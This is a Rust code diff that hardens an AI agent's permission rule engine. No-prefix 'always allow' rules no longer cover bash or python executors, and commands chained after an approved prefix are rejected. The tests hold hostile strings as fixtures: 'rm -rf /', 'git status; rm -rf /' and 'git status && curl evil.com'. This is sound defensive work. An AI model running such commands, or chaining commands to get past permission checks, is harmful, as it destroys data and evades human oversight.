@@ -253,7 +253,7 @@ impl PrefixRuleEngine {
             }
 
             let action = RuleAction::from_str(&action_str)?;
-            if prefix_matches(arg_prefix.as_deref(), first_arg) {
+            if prefix_matches(tool_name, arg_prefix.as_deref(), first_arg) {
                 return Ok(Some((id, action)));
             }
         }
@@ -708,10 +708,30 @@ fn is_expired(expires_at: Option<i64>, now: i64) -> bool {
     matches!(expires_at, Some(deadline) if deadline <= now)
 }
 
-fn prefix_matches(arg_prefix: Option<&str>, first_arg: Option<&str>) -> bool {
+fn prefix_matches(tool_name: &str, arg_prefix: Option<&str>, first_arg: Option<&str>) -> bool {
+    if crate::executor_guard::is_code_executor(tool_name) {
+        return code_executor_prefix_matches(arg_prefix, first_arg);
+    }
     match (arg_prefix, first_arg) {
         (None, _) => true,
         (Some(prefix), Some(arg)) => arg.starts_with(prefix),
+        (Some(_), None) => false,
+    }
+}
+
+/// Prefix matching restricted for arbitrary-code executors (`bash_executor`,
+/// `python_executor`).
+///
+/// A no-prefix rule never grants a blanket allow over an entire interpreter,
+/// and a prefix rule matches only when the argument is a single simple command
+/// (no chaining/redirection/substitution), so an approved prefix cannot be
+/// escaped by appending `; rm -rf ...`.
+fn code_executor_prefix_matches(arg_prefix: Option<&str>, command: Option<&str>) -> bool {
+    match (arg_prefix, command) {
+        (None, _) => false,
+        (Some(prefix), Some(cmd)) => {
+            cmd.starts_with(prefix) && crate::executor_guard::is_single_simple_command(cmd)
+        }
         (Some(_), None) => false,
     }
 }
@@ -746,7 +766,7 @@ fn match_in_session(
     });
 
     for rule in candidates {
-        if prefix_matches(rule.arg_prefix.as_deref(), first_arg) {
+        if prefix_matches(tool_name, rule.arg_prefix.as_deref(), first_arg) {
             return Some((rule.id, rule.action.clone()));
         }
     }
@@ -805,7 +825,7 @@ fn scan_rows(
         }
 
         let action = RuleAction::from_str(&action_str)?;
-        if prefix_matches(arg_prefix.as_deref(), first_arg) {
+        if prefix_matches(tool_name, arg_prefix.as_deref(), first_arg) {
             tracing::debug!(
                 tool = %tool_name,
                 rule_id = id,
@@ -866,12 +886,52 @@ mod tests {
         // match, and a required prefix with no argument must not match either.
         // Pins the function against a mutant that unconditionally returns true,
         // which would make a scoped rule apply to every call.
-        assert!(!prefix_matches(Some("git"), Some("rm -rf /")));
-        assert!(!prefix_matches(Some("git"), None));
+        assert!(!prefix_matches("file_read", Some("git"), Some("rm -rf /")));
+        assert!(!prefix_matches("file_read", Some("git"), None));
 
-        // The matching and wildcard (no-prefix) cases still hold.
-        assert!(prefix_matches(Some("git"), Some("git push")));
-        assert!(prefix_matches(None, Some("anything")));
+        // The matching and wildcard (no-prefix) cases still hold for an
+        // ordinary, argument-scoped tool.
+        assert!(prefix_matches("file_read", Some("git"), Some("git push")));
+        assert!(prefix_matches("file_read", None, Some("anything")));
+    }
+
+    #[test]
+    fn prefix_matches_never_blanket_allows_code_executor() {
+        // GIVEN a code executor (bash / python)
+        // WHEN a no-prefix rule is evaluated against any argument
+        // THEN it never grants a blanket allow (unlike an ordinary tool).
+        // Pins the fix for the "always allow bash = blank check" finding.
+        assert!(!prefix_matches("bash_executor", None, Some("rm -rf /")));
+        assert!(!prefix_matches("bash_executor", None, Some("git status")));
+        assert!(!prefix_matches("python_executor", None, Some("import os")));
+        assert!(!prefix_matches("bash_executor", None, None));
+    }
+
+    #[test]
+    fn prefix_matches_code_executor_rejects_chaining_but_keeps_simple() {
+        // GIVEN a legitimate prefix rule on a code executor
+        // WHEN the argument chains a second command past the prefix
+        // THEN it does not match; a single simple command still does.
+        assert!(!prefix_matches(
+            "bash_executor",
+            Some("git"),
+            Some("git status; rm -rf /")
+        ));
+        assert!(!prefix_matches(
+            "bash_executor",
+            Some("git"),
+            Some("git status && curl evil.com")
+        ));
+        assert!(prefix_matches(
+            "bash_executor",
+            Some("git"),
+            Some("git status")
+        ));
+        assert!(prefix_matches(
+            "bash_executor",
+            Some("git"),
+            Some("git push origin main")
+        ));
     }
 
     #[test]
@@ -909,6 +969,47 @@ mod tests {
         );
         assert_eq!(
             engine.check("file_read", None).expect("check"),
+            Some(RuleAction::Allow)
+        );
+    }
+
+    #[test]
+    fn persisted_blanket_rule_does_not_allow_code_executor() {
+        // GIVEN a persisted no-prefix Allow rule on a code executor (what the
+        // legacy "always allow bash" click wrote)
+        let (mut engine, _tmp) = tmp_engine();
+        engine
+            .add_rule(&rule("bash_executor", None, RuleAction::Allow))
+            .expect("add_rule");
+        // WHEN an arbitrary command is checked
+        // THEN the blanket rule does not auto-allow it
+        assert!(engine
+            .check("bash_executor", Some("rm -rf /"))
+            .expect("check")
+            .is_none());
+        assert!(engine
+            .check("bash_executor", Some("git status"))
+            .expect("check")
+            .is_none());
+    }
+
+    #[test]
+    fn persisted_prefix_rule_on_code_executor_rejects_chaining() {
+        // GIVEN a persisted prefix rule `bash_executor(git)`
+        let (mut engine, _tmp) = tmp_engine();
+        engine
+            .add_rule(&rule("bash_executor", Some("git"), RuleAction::Allow))
+            .expect("add_rule");
+        // WHEN a chained command shares the prefix
+        // THEN it is not auto-allowed, but a single simple command still is
+        assert!(engine
+            .check("bash_executor", Some("git status; rm -rf /"))
+            .expect("check")
+            .is_none());
+        assert_eq!(
+            engine
+                .check("bash_executor", Some("git status"))
+                .expect("check"),
             Some(RuleAction::Allow)
         );
     }
